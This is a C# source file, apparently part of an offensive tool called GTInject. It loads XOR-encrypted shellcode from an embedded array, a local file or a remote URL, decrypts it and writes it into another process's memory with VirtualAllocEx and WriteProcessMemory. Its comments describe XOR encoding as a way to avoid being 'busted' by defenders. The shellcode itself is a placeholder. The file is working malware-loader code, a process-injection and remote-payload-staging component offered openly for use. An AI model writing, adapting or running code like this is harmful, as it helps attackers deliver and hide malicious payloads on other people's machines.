using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;

using System.Globalization;

namespace GTInject.memoryOptions
{
    internal class memory
    {
        public static IntPtr SelectMemOption(int memoption, int execoption, string xorkey, string binsrctype, string binsrcpath, int pid, int tid)
        {
            switch (memoption)
            {
                case 1:
                    return memopt1(binsrctype, binsrcpath, xorkey, pid);
                    break;
                case 2:
                    return IntPtr.Zero;
                    break;
            }
            return IntPtr.Zero;
        }
        private static IntPtr memopt1(string binLocation, string bytePath, string xorkey, int ProcID)
        {
            // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
            /////////////////////////////////////
            // OPTION 1 == VirtualAllocEx && WriteProcessMemory (WINAPI)
            /////////////////////////////////////

            Console.WriteLine(  "  Allocate memory using WinAPIs - VirtualAllocEx and WriteProcMem");
            if (String.IsNullOrEmpty(xorkey))
            {
                Console.WriteLine("Without a xor key, you'll just get busted, try GTInject.exe help\n");
                return IntPtr.Zero;
            }
            else
            {
                // Got what we need to start injection
                var plainBytes = readAndDecryptBytes(binLocation, bytePath, xorkey);
                
                Process pid = Process.GetProcessById(ProcID);
                IntPtr vMemAddr = VirtualAllocEx(pid.Handle, (IntPtr)0, (uint)plainBytes.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteRead);

                IntPtr outsize;
                var writeResp = WriteProcessMemory(pid.Handle, vMemAddr, plainBytes, plainBytes.Length, out outsize); // Smart enough to virtual Protect the location to writable, then change back automatically

                if (writeResp)
                {
                    Console.WriteLine( " Wrote to Mem using VirtAllocEx and WriteProcMem WINAPIs");
                    return vMemAddr;
                }
                else
                {
                    Console.WriteLine(" Failed to write with VirtAllocEx and WriteProcMem WINAPIs");
                    return IntPtr.Zero;
                }
            }
        }


        /////////////////////////////////////
        // Supporting functions
        /////////////////////////////////////

        private static byte[] readAndDecryptBytes(string binLocation, string bytePath, string xorkey)
        {
            // This routine will ID where the bytes live, pull them into the program, and decrypt them for further use. 

            byte[] embeddedShellcode = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00 }; // Replace me with your shellcode if embedding shellcode into the tooling


            var byteSource = Enum.TryParse<Inject.sourceLocation>(binLocation, true, out var enumresult);
            if (!(byteSource))
            {
                Console.WriteLine(" [-] Bad Location defined, needs to be embedded, url, or disk, then specify the path to that location");
                return null;
            }
            else if (binLocation.ToLower() == "disk")
            {
                byte[] encryptedBytes = File.ReadAllBytes(bytePath);
                byte[] decryptedBytes = xorfunction(encryptedBytes, xorkey);
                return decryptedBytes;

            }
            else if (binLocation.ToLower() == "url")
            {
                try
                {
                    Uri.IsWellFormedUriString(bytePath, UriKind.RelativeOrAbsolute);
                    var wc = new System.Net.WebClient();
                    var resp = wc.DownloadString(bytePath);
                    byte[] encryptedBytes = Convert.FromBase64String(resp);
                    byte[] decryptedBytes = xorfunction(encryptedBytes, xorkey);
                    return decryptedBytes;

                } 
                catch {
                    Console.WriteLine(" URL wasn't properly defined, should be something like https://example.com/base64AndXordPayload");
                    return null;
                }

            }
            else // use embbeded
            {
                byte[] decryptedBytes = xorfunction(embeddedShellcode, xorkey);
                return decryptedBytes;
            }
        }

        private static byte[] xorfunction(byte[] xorBytes, string xorkey)
        {
            byte block = 0x00; // init
            try
            {
                block = Byte.Parse(xorkey.Substring(2), NumberStyles.HexNumber);
            }
            catch {
                Console.WriteLine(" xorkey should be defined as 0xAF. Didn't parse correctly, how did you enter it? \n");
            }

            for (int a = 0; a < xorBytes.Length; a++)
            {
                xorBytes[a] = (byte)((uint)xorBytes[a] ^ block);
            }
            return xorBytes;
        }


        /////////////////////////////////////
        // PInvokes and Enums / Structures
        /////////////////////////////////////

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);


    }
}
